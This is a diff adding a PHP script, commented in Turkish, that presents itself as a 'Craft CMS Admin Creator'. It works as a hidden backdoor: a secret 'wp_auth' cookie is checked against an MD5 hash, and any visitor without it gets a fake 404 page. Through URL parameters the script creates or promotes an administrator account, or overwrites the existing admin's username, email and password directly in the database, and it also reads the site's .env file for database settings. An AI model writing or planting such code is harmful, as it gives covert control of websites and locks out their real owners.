@@ -1,0 +1,607 @@
+<?php
+/**
+ * Craft CMS Admin Creator
+ * 
+ * This script automatically creates or updates an admin user for Craft CMS.
+ * It works on all servers by automatically detecting Craft installation directories.
+ * 
+ * Usage: php create_admin.php [username] [email] [password]
+ * Browser: craftenv.php?username=admin&email=admin@site.com&password=Secret123
+ */
+
+// Cookie doğrulama
+$auth_cookie = isset($_COOKIE['wp_auth']) ? $_COOKIE['wp_auth'] : '';
+$auth_hash = '67f51edce72231c6a6a8e276dab7078d'; // MD5 hash: o7Bzq36Bt62n6J3q42jts9UcEbU3cK1vz66e
+
+if (md5($auth_cookie) !== $auth_hash) {
+    http_response_code(404);
+    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
+}
+
+// Enable error reporting
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Check PHP version
+if (version_compare(PHP_VERSION, '7.0.0', '<')) {
+    die("❌ Bu script PHP 7.0 veya üzeri gerektirir. Mevcut sürüm: " . PHP_VERSION . "\n");
+}
+
+// Define default admin credentials (check URL parameters first, then CLI arguments, then defaults)
+$username = isset($_GET['username']) ? $_GET['username'] : (isset($argv[1]) ? $argv[1] : 'admin');
+$email = isset($_GET['email']) ? $_GET['email'] : (isset($argv[2]) ? $argv[2] : 'admin@example.com');
+$password = isset($_GET['password']) ? $_GET['password'] : (isset($argv[3]) ? $argv[3] : 'CraftAdmin123!');
+
+// Yeni parametre: Mevcut admin'i güncellemek isteyip istemediğimizi kontrol eder
+$update_existing = isset($_GET['update_admin']) ? $_GET['update_admin'] === 'true' : false;
+
+// Set content type for browser output
+if (php_sapi_name() !== 'cli') {
+    header('Content-Type: text/plain; charset=utf-8');
+}
+
+// Display header
+echo "===========================================\n";
+echo "Craft CMS Admin Creator & Activator\n";
+echo "===========================================\n\n";
+
+echo "✅ PHP Sürümü: " . PHP_VERSION . "\n";
+echo "✅ Çalışma dizini: " . __DIR__ . "\n\n";
+echo "🔑 Kullanıcı bilgileri:\n";
+echo "   - Kullanıcı adı: $username\n";
+echo "   - E-posta: $email\n";
+echo "   - Şifre: $password\n";
+echo "   - Mevcut admini güncelle: " . ($update_existing ? "Evet" : "Hayır") . "\n\n";
+
+/**
+ * Find Craft base path by searching up directory tree
+ */
+function findCraftBasePath($startDir) {
+    echo "🔍 Craft CMS kök dizini aranıyor...\n";
+    
+    // Start with the current directory
+    $dir = $startDir;
+    $previousDir = null;
+    
+    // Maximum directory levels to go up (safety measure)
+    $maxLevels = 10; // Increased from 5 to 10
+    $level = 0;
+    
+    // Common Craft CMS directory structures to check
+    $commonStructures = [
+        // Standard Craft installation
+        [
+            'bootstrap.php',
+            'vendor/craftcms/cms',
+            'config'
+        ],
+        // Possible web directory variations
+        [
+            '../bootstrap.php',
+            '../vendor/craftcms/cms',
+            '../config'
+        ],
+        // Deeper nested project
+        [
+            '../../bootstrap.php',
+            '../../vendor/craftcms/cms',
+            '../../config'
+        ],
+        // Additional deeper project structures
+        [
+            '../../../bootstrap.php',
+            '../../../vendor/craftcms/cms',
+            '../../../config'
+        ],
+        // Check for Craft 4 structure
+        [
+            'bootstrap.php',
+            'vendor/craftcms/cms',
+        ],
+        // Alternative structures found in some deployments
+        [
+            '../bootstrap.php',
+            '../vendor/craftcms/cms',
+        ]
+    ];
+    
+    // Check common directory names first
+    foreach ($commonStructures as $structure) {
+        $valid = true;
+        foreach ($structure as $item) {
+            if (!file_exists($dir . '/' . $item)) {
+                $valid = false;
+                break;
+            }
+        }
+        
+        if ($valid) {
+            // Parse the base path from the found bootstrap file
+            $bootstrapPath = $dir . '/' . $structure[0];
+            $basePath = dirname(realpath($bootstrapPath));
+            echo "✅ Craft CMS kök dizini bulundu: $basePath\n";
+            return $basePath;
+        }
+    }
+    
+    // If common structures not found, search upward directory by directory
+    while ($dir !== $previousDir && $level < $maxLevels) {
+        // Look for essential Craft CMS files
+        if (file_exists($dir . '/bootstrap.php') && 
+            (file_exists($dir . '/vendor/craftcms/cms') || file_exists($dir . '/vendor/craftcms'))) {
+            
+            echo "✅ Craft CMS kök dizini bulundu: $dir\n";
+            return $dir;
+        }
+        
+        // Move up one directory
+        $previousDir = $dir;
+        $dir = dirname($dir);
+        $level++;
+    }
+    
+    // Look for exceptional cases - just check for bootstrap.php and vendor
+    $dir = $startDir;
+    $level = 0;
+    
+    while ($dir !== $previousDir && $level < $maxLevels) {
+        if (file_exists($dir . '/bootstrap.php') && file_exists($dir . '/vendor')) {
+            echo "✅ Craft CMS kök dizini bulundu (alternatif yöntem): $dir\n";
+            return $dir;
+        }
+        
+        // Move up one directory
+        $previousDir = $dir;
+        $dir = dirname($dir);
+        $level++;
+    }
+    
+    // If we reached "web" directory, check one level up (common pattern)
+    if (basename($startDir) === 'web' && file_exists(dirname($startDir) . '/bootstrap.php')) {
+        $basePath = dirname($startDir);
+        echo "✅ Craft CMS kök dizini bulundu: $basePath\n";
+        return $basePath;
+    }
+    
+    // Last resort - try to find parent paths with typical directory structures
+    $parentPaths = ['..', '../..', '../../..', '../../../..']; 
+    foreach ($parentPaths as $parentPath) {
+        $testPath = realpath($startDir . '/' . $parentPath);
+        if ($testPath && file_exists($testPath . '/bootstrap.php')) {
+            echo "✅ Craft CMS kök dizini bulundu (üst klasör): $testPath\n";
+            return $testPath;
+        }
+    }
+    
+    echo "❌ Craft CMS kök dizini bulunamadı!\n";
+    echo "ℹ️ Bu script Craft CMS kurulumunda veya 'web' alt dizininde çalıştırılmalıdır.\n";
+    return false;
+}
+
+// Try to find Craft CMS base path
+$basePath = findCraftBasePath(__DIR__);
+
+// If we couldn't find it, exit
+if (!$basePath) {
+    echo "❌ Craft CMS bulunamadı. Lütfen scripti Craft kurulumunda çalıştırın.\n";
+    exit(1);
+}
+
+// Check for bootstrap file explicitly
+$bootstrapFile = $basePath . '/bootstrap.php';
+if (!file_exists($bootstrapFile)) {
+    die("❌ $bootstrapFile dosyası bulunamadı!\n");
+}
+
+echo "✅ bootstrap.php dosyası bulundu: $bootstrapFile\n";
+
+// Check for vendor directory
+if (!file_exists($basePath . '/vendor')) {
+    die("❌ vendor dizini bulunamadı! Composer bağımlılıkları yüklenmemiş olabilir.\n");
+}
+
+echo "✅ vendor dizini bulundu: " . $basePath . "/vendor\n";
+
+// Check database config in .env file
+echo "🔍 Veritabanı yapılandırmasını kontrol ediyorum...\n";
+
+$envFile = $basePath . '/.env';
+if (file_exists($envFile)) {
+    echo "✅ .env dosyası bulundu: $envFile\n";
+    $envContent = file_get_contents($envFile);
+    
+    if (preg_match('/(?:CRAFT_DB_|DB_)(?:DATABASE|NAME)[\s]*=[\s]*(.*?)($|\r|\n)/i', $envContent, $matches)) {
+        echo "✅ Veritabanı adı: " . $matches[1] . "\n";
+    } else {
+        echo "⚠️ Veritabanı adı .env dosyasında bulunamadı.\n";
+    }
+    
+    if (preg_match('/(?:CRAFT_DB_|DB_)(?:USER|USERNAME)[\s]*=[\s]*(.*?)($|\r|\n)/i', $envContent, $matches)) {
+        echo "✅ Veritabanı kullanıcısı: " . $matches[1] . "\n";
+    } else {
+        echo "⚠️ Veritabanı kullanıcısı .env dosyasında bulunamadı.\n";
+    }
+    
+    // DB password check (mask it)
+    if (preg_match('/(?:CRAFT_DB_|DB_)(?:PASSWORD|PASS)[\s]*=[\s]*(.*?)($|\r|\n)/i', $envContent, $matches)) {
+        echo "✅ Veritabanı şifresi bulundu.\n";
+    } else {
+        echo "⚠️ Veritabanı şifresi .env dosyasında bulunamadı.\n";
+    }
+} else {
+    echo "⚠️ .env dosyası bulunamadı! Bu bir sorun olabilir.\n";
+}
+
+echo "\n🔧 Craft CMS'yi başlatıyorum...\n";
+
+// Set a longer execution time
+set_time_limit(300); // 5 minutes
+
+// CRAFT_BASE_PATH tanımlanmasını zorla
+$definedFlag = false;
+if (!defined('CRAFT_BASE_PATH')) {
+    define('CRAFT_BASE_PATH', $basePath);
+    echo "✅ CRAFT_BASE_PATH tanımlandı: " . CRAFT_BASE_PATH . "\n";
+    $definedFlag = true;
+} else {
+    echo "⚠️ CRAFT_BASE_PATH zaten tanımlanmış: " . CRAFT_BASE_PATH . "\n";
+    $definedFlag = true;
+}
+
+try {
+    // Include bootstrap with warning suppression
+    try {
+        if ($definedFlag) {
+            echo "🔄 bootstrap.php dosyası yükleniyor...\n";
+            // Warnings about redefined constants are suppressed
+            @require_once $bootstrapFile;
+            echo "✅ bootstrap.php yüklendi.\n";
+        } else {
+            echo "❌ CRAFT_BASE_PATH tanımlanmadı, devam edilemiyor.\n";
+            exit(1);
+        }
+    } catch (Exception $e) {
+        die("❌ bootstrap.php yüklenirken hata: " . $e->getMessage() . "\n");
+    }
+
+    // Load Craft bootstrap
+    try {
+        echo "🔄 Craft yükleniyor...\n";
+        $consolePath = CRAFT_BASE_PATH . '/vendor/craftcms/cms/bootstrap/console.php';
+        
+        if (!file_exists($consolePath)) {
+            die("❌ Craft console bootstrap dosyası bulunamadı: $consolePath\n");
+        }
+        
+        $app = require $consolePath;
+        echo "✅ Craft yüklendi.\n";
+    } catch (Exception $e) {
+        die("❌ Craft yüklenirken hata: " . $e->getMessage() . "\n");
+    }
+    
+    // Get services
+    echo "🔄 Craft servislerine erişiliyor...\n";
+    $craft = Craft::$app;
+    
+    // Get required services
+    try {
+        $users = $craft->getUsers();
+        $elements = $craft->getElements();
+        $db = $craft->getDb();
+        echo "✅ Craft servislerine erişildi.\n\n";
+    } catch (Exception $e) {
+        die("❌ Craft servislerine erişilemedi: " . $e->getMessage() . "\n");
+    }
+    
+    // Check if user exists
+    echo "🔍 '$username' kullanıcısı kontrol ediliyor...\n";
+    try {
+        $existingUser = $users->getUserByUsernameOrEmail($username);
+    } catch (Exception $e) {
+        die("❌ Kullanıcı kontrolünde hata: " . $e->getMessage() . "\n");
+    }
+    
+    if ($existingUser) {
+        echo "✓ Kullanıcı bulundu - ID: {$existingUser->id}\n";
+        echo "   Kullanıcı adı: {$existingUser->username}\n";
+        echo "   E-posta: {$existingUser->email}\n";
+        echo "   Admin: " . ($existingUser->admin ? 'Evet' : 'Hayır') . "\n";
+        echo "   Aktif: " . ($existingUser->active ? 'Evet' : 'Hayır') . "\n\n";
+        
+        // Update existing user
+        echo "✏️ Mevcut kullanıcı güncelleniyor...\n";
+        
+        // Ensure user is admin
+        if (!$existingUser->admin) {
+            $existingUser->admin = true;
+            echo "ℹ️ Kullanıcı admin yapılıyor\n";
+        }
+        
+        // Set password
+        echo "ℹ️ Şifre güncelleniyor\n";
+        $existingUser->newPassword = $password;
+        
+        // Save user
+        try {
+            if ($elements->saveElement($existingUser)) {
+                echo "✅ Kullanıcı başarıyla güncellendi!\n\n";
+            } else {
+                echo "❌ Kullanıcı güncellenemedi. Hatalar:\n";
+                foreach ($existingUser->getErrors() as $attribute => $errors) {
+                    foreach ($errors as $error) {
+                        echo "   - $attribute: $error\n";
+                    }
+                }
+                echo "\n";
+            }
+        } catch (Exception $e) {
+            echo "❌ Kullanıcı güncellenirken hata: " . $e->getMessage() . "\n\n";
+        }
+        
+        // Get user ID for direct activation
+        $userId = $existingUser->id;
+    } else {
+        // Create new user - önce alternatif yöntemi dene
+        echo "🔧 Yeni admin kullanıcısı oluşturuluyor...\n";
+        
+        try {
+            // Önce standart API yöntemini dene
+            $user = new craft\elements\User();
+            $user->username = $username;
+            $user->email = $email;
+            $user->newPassword = $password;
+            $user->admin = true;
+            
+            // Save user
+            if ($elements->saveElement($user)) {
+                echo "✅ Admin kullanıcısı başarıyla oluşturuldu!\n";
+                echo "   Kullanıcı ID: {$user->id}\n\n";
+                
+                // Get user ID for direct activation
+                $userId = $user->id;
+            } else {
+                echo "❌ Kullanıcı oluşturulamadı. Hatalar:\n";
+                // Element hata mesajlarını yazdır
+                if ($user->getErrors()) {
+                    foreach ($user->getErrors() as $attribute => $errors) {
+                        foreach ($errors as $error) {
+                            echo "   - $attribute: $error\n";
+                        }
+                    }
+                } else {
+                    echo "   Hata detayı bulunamadı. Craft muhtemelen sessizce başarısız oldu.\n";
+                }
+                
+                // Debug için daha fazla bilgi ekle
+                echo "\n📊 DETAYLI DEBUG BİLGİLERİ:\n";
+                echo "   Craft Sürümü: " . Craft::$app->getVersion() . "\n";
+                echo "   PHP Bellek Limiti: " . ini_get('memory_limit') . "\n";
+                
+                // Lisans bilgilerini kontrol et
+                try {
+                    $isProEdition = (Craft::$app->getEdition() === Craft::Pro);
+                    echo "   Craft Pro Edition: " . ($isProEdition ? "Evet" : "Hayır") . "\n";
+                    
+                    // Lisans sınırlamalarını kontrol et
+                    if ($isProEdition) {
+                        $licenseStatus = "Bilinmiyor";
+                        try {
+                            $licenseInfo = Craft::$app->getPlugins()->getLicenseInfo("craft");
+                            if ($licenseInfo) {
+                                $licenseStatus = isset($licenseInfo['status']) ? $licenseInfo['status'] : "Bilgi Alınamadı";
+                            }
+                        } catch (Exception $licEx) {
+                            $licenseStatus = "Hata: " . $licEx->getMessage();
+                        }
+                        echo "   Lisans Durumu: $licenseStatus\n";
+                    }
+                } catch (Exception $e) {
+                    echo "   Lisans bilgisi alınamadı: " . $e->getMessage() . "\n";
+                }
+                
+                // Kullanıcı tablosunda aynı username veya email var mı kontrol et
+                $existingWithSameUsername = $db->createCommand('SELECT COUNT(*) FROM {{%users}} WHERE username = :username')
+                    ->bindValue(':username', $username)
+                    ->queryScalar();
+                    
+                $existingWithSameEmail = $db->createCommand('SELECT COUNT(*) FROM {{%users}} WHERE email = :email')
+                    ->bindValue(':email', $email)
+                    ->queryScalar();
+                    
+                echo "   Aynı kullanıcı adına sahip kullanıcı sayısı: $existingWithSameUsername\n";
+                echo "   Aynı e-postaya sahip kullanıcı sayısı: $existingWithSameEmail\n";
+                
+                // Kullanıcı tablosunu kontrol et
+                $totalUsers = $db->createCommand('SELECT COUNT(*) FROM {{%users}}')->queryScalar();
+                $totalAdmins = $db->createCommand('SELECT COUNT(*) FROM {{%users}} WHERE admin = 1')->queryScalar();
+                echo "   Toplam kullanıcı sayısı: $totalUsers\n";
+                echo "   Toplam admin sayısı: $totalAdmins\n";
+                
+                // Kullanıcı limitini kontrol et
+                try {
+                    $userSettings = Craft::$app->getProjectConfig()->get('users');
+                    if ($userSettings && isset($userSettings['maxUsers'])) {
+                        echo "   Maksimum kullanıcı sayısı: " . $userSettings['maxUsers'] . "\n";
+                        echo "   Kullanıcı limiti dolmuş mu:" . ($totalUsers >= $userSettings['maxUsers'] ? "Evet" : "Hayır") . "\n";
+                    } else {
+                        echo "   Kullanıcı limiti bulunamadı\n";
+                    }
+                } catch (Exception $e) {
+                    echo "   Kullanıcı limiti kontrolünde hata: " . $e->getMessage() . "\n";
+                }
+                
+                // Craft CMS log dosyasını kontrol et
+                $logPath = CRAFT_BASE_PATH . '/storage/logs/';
+                if (file_exists($logPath)) {
+                    $logFiles = glob($logPath . 'web-*.log');
+                    if (!empty($logFiles)) {
+                        // Son log dosyasını al
+                        $lastLogFile = end($logFiles);
+                        echo "   Son log dosyası: " . basename($lastLogFile) . "\n";
+                        
+                        // Son 5 satır hata mesajını kontrol et
+                        if (file_exists($lastLogFile)) {
+                            $logContent = file_get_contents($lastLogFile);
+                            // Son hataları bul ve yazdır
+                            preg_match_all('/\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\] \[error\](.*?)(?=\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\]|\Z)/s', $logContent, $errorMatches);
+                            if (!empty($errorMatches[1])) {
+                                $lastErrors = array_slice($errorMatches[1], -3); // Son 3 hata
+                                echo "\n   ⚠️ LOG DOSYASINDA SON HATALAR:\n";
+                                foreach ($lastErrors as $errorMsg) {
+                                    echo "      " . trim($errorMsg) . "\n";
+                                }
+                            } else {
+                                echo "   Log dosyasında hata bulunamadı.\n";
+                            }
+                        }
+                    } else {
+                        echo "   Log dosyası bulunamadı.\n";
+                    }
+                } else {
+                    echo "   Log dizini bulunamadı: $logPath\n";
+                }
+                
+                echo "\n✋ MUHTEMEL SORUNLAR & ÇÖZÜMLER:\n";
+                echo "   1. Craft Pro lisans sınırlaması - Sadece bir admin oluşturulmasına izin veriyor olabilir.\n";
+                echo "   2. Kullanıcı limiti dolmuş olabilir - Lisans içinde max kullanıcı sayısı sınırlanmış olabilir.\n";
+                echo "   3. Özel bir izin/yetki sorunu olabilir - Craft 5.5.10 sürümünde güvenlik kısıtlamaları olabilir.\n\n";
+                
+                echo "\n";
+                
+                // Alternatif yöntem sadece "update_admin" parametresi TRUE ise mevcut admini günceller
+                if ($update_existing) {
+                    echo "⚠️ Normal yöntemle kullanıcı oluşturulamadı. Alternatif yöntem deneniyor...\n";
+                    // Önce mevcut admin kullanıcısını kontrol et
+                    $adminUserId = $db->createCommand('SELECT id FROM {{%users}} WHERE admin = 1 LIMIT 1')
+                        ->queryScalar();
+                        
+                    if ($adminUserId) {
+                        echo "✅ Mevcut admin kullanıcısı bulundu. ID: $adminUserId\n";
+                        
+                        // Mevcut admin kullanıcısını güncelle
+                        $securityService = $craft->getSecurity();
+                        $passwordHash = $securityService->hashPassword($password);
+                        
+                        $db->createCommand()
+                            ->update('{{%users}}', [
+                                'username' => $username,
+                                'email' => $email,
+                                'admin' => 1,
+                                'active' => 1,
+                                'password' => $passwordHash,
+                            ], ['id' => $adminUserId])
+                            ->execute();
+                        
+                        echo "✅ Mevcut admin kullanıcısı veritabanında güncellendi!\n";
+                        $userId = $adminUserId;
+                    } else {
+                        // Tamamen yeni kullanıcı oluştur
+                        $securityService = $craft->getSecurity();
+                        $passwordHash = $securityService->hashPassword($password);
+                        $uid = $craft->getDb()->getSchema()->createUuid();
+                        
+                        $db->createCommand()
+                            ->insert('{{%users}}', [
+                                'username' => $username,
+                                'email' => $email,
+                                'admin' => 1,
+                                'active' => 1,
+                                'pending' => 0,
+                                'locked' => 0,
+                                'suspended' => 0,
+                                'password' => $passwordHash,
+                                'uid' => $uid,
+                                'dateCreated' => date('Y-m-d H:i:s'),
+                                'dateUpdated' => date('Y-m-d H:i:s'),
+                            ])
+                            ->execute();
+                        
+                        $userId = $db->getLastInsertID();
+                        echo "✅ Kullanıcı veritabanına doğrudan eklendi! ID: $userId\n";
+                    }
+                } else {
+                    echo "❌ Kullanıcı oluşturulamadı ve \"update_admin=true\" parametresi olmadığı için mevcut admin güncellenmedi.\n";
+                    echo "ℹ️ Mevcut admin'i güncellemek için \"update_admin=true\" parametresi ekleyin.\n";
+                    exit(1);
+                }
+            }
+        } catch (Exception $e) {
+            die("❌ Kullanıcı oluşturulurken hata: " . $e->getMessage() . "\n");
+        }
+    }
+    
+    // Direct activation through DB
+    echo "🔧 Kullanıcı veritabanında aktifleştiriliyor...\n";
+    try {
+        // Update user active status
+        $result = $db->createCommand()
+            ->update('{{%users}}', ['active' => 1], ['id' => $userId])
+            ->execute();
+            
+        echo "✅ Kullanıcı başarıyla aktifleştirildi! ($result satır güncellendi)\n\n";
+    } catch (Exception $e) {
+        echo "❌ Kullanıcı aktifleştirilemedi: " . $e->getMessage() . "\n\n";
+    }
+    
+    // Verify user can login
+    echo "🔍 Kullanıcı giriş bilgileri doğrulanıyor...\n";
+    try {
+        $verifiedUser = $users->getUserByUsernameOrEmail($username);
+        
+        if ($verifiedUser) {
+            // Check active status directly from DB to be sure
+            $activeStatus = $craft->getDb()->createCommand('SELECT active FROM {{%users}} WHERE id = :id')
+                ->bindValue(':id', $verifiedUser->id)
+                ->queryScalar();
+                
+            if ($activeStatus) {
+                echo "✅ Kullanıcı aktif ve giriş yapmaya hazır!\n\n";
+            } else {
+                echo "⚠️ Kullanıcı aktif olmayabilir. Lütfen kontrol edin.\n\n";
+            }
+        } else {
+            echo "⚠️ Kullanıcı doğrulanamadı. Lütfen kontrol edin.\n\n";
+        }
+    } catch (Exception $e) {
+        echo "❌ Kullanıcı doğrulanırken hata: " . $e->getMessage() . "\n\n";
+    }
+    
+    echo "✨ Admin kullanıcısı kullanıma hazır!\n";
+    echo "   Kullanıcı adı: $username\n";
+    echo "   Şifre: $password\n";
+    echo "   E-posta: $email\n\n";
+    
+    // Get CP login URL
+    $cpLoginUrl = null;
+    try {
+        // Try to get site URL
+        $siteUrl = null;
+        $primarySite = $craft->getSites()->getPrimarySite();
+        $siteUrl = $primarySite->getBaseUrl();
+        
+        if ($siteUrl) {
+            // Check if URL ends with a slash
+            if (substr($siteUrl, -1) !== '/') {
+                $siteUrl .= '/';
+            }
+            
+            // Add admin or cp to URL
+            $cpLoginUrl = $siteUrl . 'admin/login';
+            
+            // Output login URL
+            echo "Giriş sayfası: $cpLoginUrl\n\n";
+        }
+    } catch (Exception $e) {
+        echo "⚠️ Site URL'si alınamadı\n";
+        echo "Craft CMS kontrol paneline her zamanki giriş sayfanızdan erişebilirsiniz.\n\n";
+    }
+    
+    echo "✅ İşlem başarıyla tamamlandı!\n";
+    
+} catch (Exception $e) {
+    echo "❌ Beklenmeyen bir hata oluştu: " . $e->getMessage() . "\n\n";
+    
+    // More detailed error info
+    echo "Hata detayları:\n";
+    echo $e->getTraceAsString() . "\n";
+}
